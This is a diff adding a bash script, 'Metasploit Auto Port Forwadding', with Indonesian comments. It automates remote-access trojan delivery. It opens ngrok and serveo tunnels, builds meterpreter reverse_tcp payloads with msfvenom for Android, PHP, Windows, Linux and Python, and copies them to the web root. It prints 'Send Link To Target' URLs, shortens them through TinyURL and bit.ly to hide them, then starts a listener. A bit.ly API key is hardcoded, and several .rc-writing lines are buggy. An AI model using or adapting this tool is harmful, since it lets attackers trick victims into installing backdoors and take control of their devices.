@@ -1,0 +1,361 @@
+#!/bin/bash
+# Metasploit Auto Port Forwadding
+# Version : 1.0
+# Author : Mr.cakil
+# Don't remove Author
+# Hargailah pembuat nya !!
+# Copyright@2018 Mrcakil
+
+rm -rf tcp
+rm -rf httphost
+lightgreen='\e[1;32m'
+blue='\e[0;34'
+cyan='\e[1;96m'
+green='\e[0;34m'
+okegreen='\033[92m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[033;91m'
+yellow='\e[033;93m'
+
+echo -e " $lightgreen"
+stop() {
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+fi
+if [[ -e hosthttp ]]; then
+rm -rf tcp http
+fi
+
+}
+stop
+
+kil="127.0.0.1"
+port="1337"
+akun="o_1o6ig4t6q1"
+key="R_e656535d4eff4c39bb0f099192742e80"
+apachePath="/var/www/html"
+PS3="Penetration Revolution]>"
+echo -e "$red[*]$cyan METASPLOIT PACK V1.2$red[*]"
+echo -e "$red[*]$cyan Fitur : Auto Port Forwad, Auto Shortlink, $red[*]"
+echo -e "$yellow"
+mainmenu=("Android" "python" "Web" "Linux" "Windows" "Web Delivery" "DICTIONARY SCANNER" "shodan Search")
+select opt in "${mainmenu[@]}"
+do
+case $opt in
+##case "$mainmenu" in 
+   "Android") 
+android() {
+
+ngrok start -all > /dev/null 2>&1 &
+sleep 10                                                                                                               
+host=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p')
+echo "$host" > tcp
+hostnya=$(grep -o "/*[0-9].tcp.ngrok.io" tcp)
+porte=$(grep -o "/*[0-9]/*[0-9]/*[0-9]/*[0-9]/*[0-9]" tcp)
+     echo -e "$red[*]$yellow Forwadding TCP : " $host
+     echo -e "$red[*]$yellow Hostname : " $hostnya
+     echo -e "$red[*]$yellow Port : " $porte
+     echo -e "$red[*]$lightgreen SUCCESSFULL!"
+echo -e " Note* Don't Use Extension e'g : backdoor"
+read -p "Enter File Name : " apk;
+echo -e "$red[+]$yellow Generate Payload Apk"
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$hostnya LPORT=$porte R > $apk.apk 
+     mv $apk.apk $apachePath
+     echo -e "$red[*]$lightgreen Original Payload. Attack Vector :$yellow  http://$kil/$apk.apk"
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+#hostnyaa=$(grep -o "[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z].ngrok.io" http)
+printf "\n"
+     echo -e "$red[*]$lightgreen Forwading HTTP Server !!"
+     echo -e "$red[*]$lightgreen Send Link To Target :  $yellow " $hosthttp/$apk.apk
+     cakill="https://$hosthttp/$apk.apk"
+     sleep 3
+
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$cakill | head -n1)
+     echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+shortlink=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=$cakill&format=txt" 2> /dev/null)
+     echo -e "$red[*]$lightgreen Or Shortlink1 : " $shortlink
+printf "\n"
+
+read -p "LISTENER (y/t) :" listen;
+if [ $listen = y ] || [ $listen = Y ]
+then
+touch meterpreter.rc
+            echo use exploit/multi/handler > meterpreter.rc
+            echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc
+            echo set LHOST $kil >> meterpreter.rc
+            echo set LPORT $port >> meterpreter.rc
+            echo exploit >> meterpreter.rc
+            echo -e "$red[+]$cyan Listener With Tcp Forwadding"
+echo -e "$red[+]$cyan please wait"
+#xterm -T " Penetration Revolution Framework " -geometry 110x23 -e "sudo msfconsole -r meterpreter.rc" > /dev/null 2>&1
+msfconsole -r meterpreter.rc
+fi
+if [ $listen = t ] || [ $listen = T ]
+then
+echo "oke Exiting Tools"
+fi
+}
+android
+               ;;
+
+
+
+
+               "Web") 
+ngrok start -all > /dev/null 2>&1 &
+sleep 10                                                                                                               
+host=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p')
+echo "$host" > tcp
+hostnya=$(grep -o "/*[0-9].tcp.ngrok.io" tcp)
+porte=$(grep -o "/*[0-9]/*[0-9]/*[0-9]/*[0-9]/*[0-9]" tcp)
+
+echo -e "$red[*]$yellow Forwadding TCP : " $host
+echo -e "$red[*]$yellow Hostname : " $hostnya
+echo -e "$red[*]$yellow Port : " $porte
+echo -e "$red[*]$lightgreen SUCCESSFULL!"
+echo -e "$red[+]$yellow Don't Use Extension e'g : Backdoor $lightgreen"
+
+    read -p "Masukan Nama file : " php;
+    echo -e "$red[+]$yellow Generate Payload PHP Web"
+    msfvenom -p php/meterpreter/reverse_tcp LHOST=$hostnya LPORT=$porte R > $php.php
+
+mv $php.php $apachePath
+echo -e "$red[*]$lightgreen Original Payload. Attack Vector :$yellow  http://$kil/$php.php"
+
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+#hostnyaa=$(grep -o "[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z].ngrok.io" http)
+
+printf "\n"
+     echo -e "$red[*]$lightgreen Forwading HTTP Server !!"
+     echo -e "$red[*]$lightgreen Send Link To Target :  $yellow " $hosthttp/$php.php
+
+cakill="https://$hosthttp/$php.php"
+     sleep 3
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$cakill | head -n1)
+     echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+shortlink=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=$cakill&format=txt" 2> /dev/null)
+     echo -e "$red[*]$lightgreen Or Shortlink1 : " $shortlink
+printf "\n"
+
+read -p "LISTENER (y/t) :" listen;
+if [ $listen = y ] || [ $listen = Y ]
+then
+            touch meterpreter_web.rc
+            echo use exploit/multi/handler > meterpreter_web.rc
+            echo set PAYLOAD php/meterpreter/reverse_tcp >> meterpreter_web.rc
+            echo set LHOST $kil >> meterpreter_web.rc
+            echo set LPORT $port >> meterpreter_web.rc
+            echo exploit  >> meterpreter_web.rc
+            echo -e "$red[+]$cyan Listener With Tcp Forwadding"
+echo -e "$red[+]$cyan please Wait !!"
+ msfconsole -r meterpreter_web.rc
+fi
+if [ $listen = t ] || [ $listen = T ]
+then
+echo "oke Exiting Tools"
+fi
+               ;;
+
+                           
+						   "Windows") 
+ngrok start -all > /dev/null 2>&1 &
+sleep 10                                                                                                               
+host=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p')
+echo "$host" > tcp
+hostnya=$(grep -o "/*[0-9].tcp.ngrok.io" tcp)
+porte=$(grep -o "/*[0-9]/*[0-9]/*[0-9]/*[0-9]/*[0-9]" tcp)
+
+echo -e "$red[*]$yellow Forwadding TCP : " $host
+echo -e "$red[*]$yellow Hostname : " $hostnya
+echo -e "$red[*]$yellow Port : " $porte
+echo -e "$red[*]$lightgreen SUCCESSFULL!"
+
+      echo -e "$red[+]$yellow Don't Use Extension e'g : Backdoor $lightgreen"
+      read -p "Masukan Nama file : " file;
+      echo -e "$red[+]$yellow Generate Payload Windows"     
+      msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=$hostnya LPORT=$porte -o $file.exe
+
+mv $file.exe $apachePath
+echo -e "$red[*]$lightgreen Original Payload. Attack Vector :$yellow  http://$kil/$file.exe"
+
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+#hostnyaa=$(grep -o "[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z]/*[0-9a-z].ngrok.io" http)
+
+printf "\n"
+echo -e "$red[*]$lightgreen Forwading HTTP Server !!"
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow " $hosthttp/$file.exe
+cakill="https://$hosthttp/$file.exe"
+sleep 3
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$cakill | head -n1)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+shortlink=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=$cakill&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink1 : " $shortlink
+printf "\n"
+
+read -p "LISTENER (y/t) :" listen;
+if [ $listen = y ] || [ $listen = Y ]
+then
+            touch meterpreter_windows.rc
+            echo use exploit/multi/handler > meterpreter_windows.rc
+            echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter_windows.rc
+            echo set LHOST $kil >> meterpreter_windows.rc
+            echo set LPORT $port >> meterpreter_windows.rc
+            echo exploit  >> meterpreter_windows.rc
+            echo -e "$red[+]$cyan Listener With Tcp Forwadding"
+            echo -e "$red[+]$cyan please Wait !!"
+            msfconsole -r meterpreter_windows.rc
+fi
+if [ $listen = t ] || [ $listen = T ]
+then
+   echo "oke Exiting Tools"
+fi
+            ;;
+               
+			   
+			   "Linux") 
+ngrok tcp $port > /dev/null 2>&1 &
+sleep 10
+link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "0.tcp.ngrok.io:/*[0-9]/*[0-9]/*[0-9]/*[0-9]/*[0-9]")
+echo "$link" > forward
+host=$(grep -o "0.tcp.ngrok.io" forward)
+porte=$(grep -o "/*[0-9]/*[0-9]/*[0-9]/*[0-9]/*[0-9]" forward)
+echo -e "$red[*]$lightgreen Forwadding TCP : " $link
+echo -e "$red[*]$lightgreen Hostname : " $host
+echo -e "$red[*]$lightgreen Port : " $porte
+echo -e "$red[*]$lightgreen SUCCESSFULL!"
+
+read -p "Masukan Nama file : " file;
+echo -e "$red[+]$yellow Generate Payload Linux"
+      msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$host LPORT=$porte R > $file
+
+mv $file $apachePath
+echo -e "$red[*]$lightgreen Original Payload. Attack Vector :$yellow  http://$kil/$file"
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:8080 serveo.net 2> /dev/null > server ' &
+sleep 20
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" server)
+printf "\n"
+echo -e "$red[*]$lightgreen Forwading HTTP Server !!"
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow" $send_link/$file
+cakill="$send_link/$file"
+sleep 3
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$cakill | head -n1)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+shortlink=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=$cakill&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink1 : " $shortlink
+printf "\n"
+read -p "LISTENER (y/t) :" listen;
+if [ $listen = y ] || [ $listen = Y ]
+then
+            touch meterpreter_Linux.rc
+            echo use exploit/multi/handler > meterpreter_linux.rc
+            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> meterpreter_linux.rc
+            echo set LHOST $kil >> meterpreter_linux.rc
+            echo set LPORT $port >> meterpreter_linux.rc
+            echo exploit  >> meterpreter_linux.rc
+            echo -e "$red[+]$cyan Listener With Tcp Forwadding"
+echo -e "$red[+]$cyan please Wait !!"
+            msfconsole -r meterpreter_linux.rc
+fi
+if [ $listen = t ] || [ $listen = T ]
+then
+echo "oke Exiting Tools"
+fi    
+
+        ;;
+               "python") 
+ngrok tcp $port > /dev/null 2>&1 &
+sleep 10
+link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "0.tcp.ngrok.io:/*[0-9]/*[0-9]/*[0-9]/*[0-9]/*[0-9]")
+echo "$link" > forward
+host=$(grep -o "0.tcp.ngrok.io" forward)
+porte=$(grep -o "/*[0-9]/*[0-9]/*[0-9]/*[0-9]/*[0-9]" forward)
+echo -e "$red[*]$lightgreen Forwadding TCP : " $link
+echo -e "$red[*]$lightgreen Hostname : " $host
+echo -e "$red[*]$lightgreen Port : " $porte
+echo -e "$red[*]$lightgreen SUCCESSFULL!"
+
+echo -e "$red[+]$yellow Don't Use Extension e'g : Backdoor $lightgreen"
+      read -p "Masukan Nama file : " file;
+      echo -e "$red[+]$yellow Generate Payload Python"
+ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$porte R > $file.py
+
+mv $file.py $apachePath
+echo -e "$red[*]$lightgreen Original Payload. Attack Vector :$yellow  http://$kil/$file.py"
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:8080 serveo.net 2> /dev/null > server ' &
+sleep 20
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" server)
+printf "\n"
+echo -e "$red[*]$lightgreen Forwading HTTP Server !!"
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow" $send_link/$file.py
+cakill="$send_link/$file.py"
+sleep 3
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$cakill | head -n1)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+shortlink=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=$cakill&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink1 : " $shortlink
+printf "\n"
+read -p "LISTENER (y/t) :" listen;
+if [ $listen = y ] || [ $listen = Y ]
+then
+            touch meterpreter_python.rc
+            echo use exploit/multi/handler > meterpreter_python.rc
+            echo set PAYLOAD python/meterpreter/reverse_tcp >> meterpreter_python.rc
+            echo set LHOST $kil >> meterpreter_python.rc
+            echo set LPORT $port >> meterpreter_python.rc
+            echo exploit  >> meterpreter_python.rc
+            echo -e "$red[+]$cyan Listener With Tcp Forwadding"
+echo -e "$red[+]$cyan please Wait !!"
+            msfconsole -r meterpreter_python.rc 
+fi
+if [ $listen = t ] || [ $listen = T ]
+then
+echo "oke Exiting Tools"
+fi 
+
+          ;;
+"DICTIONARY SCANNER")
+read -p "SET TARGET HOST >> " host;
+read -p "SET WORDLIST >> " word;
+touch dir.rc
+echo use auxiliary/scanner/http/dir_scanner > dir.rc
+echo set RHOSTS $host > dir.rc
+echo set DICTIONARY $word > dir.rc
+echo exploit > dir.rc
+echo -e "$red[*]$lightgreen PLEASE WAIT !!"
+msfconsole -r dir.rc
+;;
+"shodan Search")
+echo -e "$red[*]$lightgreen Note * Silahkan Login ke shodan.io Lalu klik Show api Key dan pastekan kesini"
+read -p "Api Key >>  " api;
+read -p "Search Query >> " query;
+touch shodan.rc
+echo use auxiliary/gather/shodan_search > shodan.rc
+echo set SHODAN_APIKEY $api > shodan.rc
+set QUERY $query > shodan.rc
+echo exploit > shodan.rc
+;;
+               "Web Delivery") 
+            touch meterpreter_delivery.rc
+            echo use exploit/multi/script/web_delivery > meterpreter_delivery.rc
+            echo show targets >> meterpreter_delivery.rc
+            echo "please wait !! Sedang berjalan!"
+            msfconsole -r meterpreter_delivery.rc 
+            ;;
+            *) echo invalid options
+esac
+done
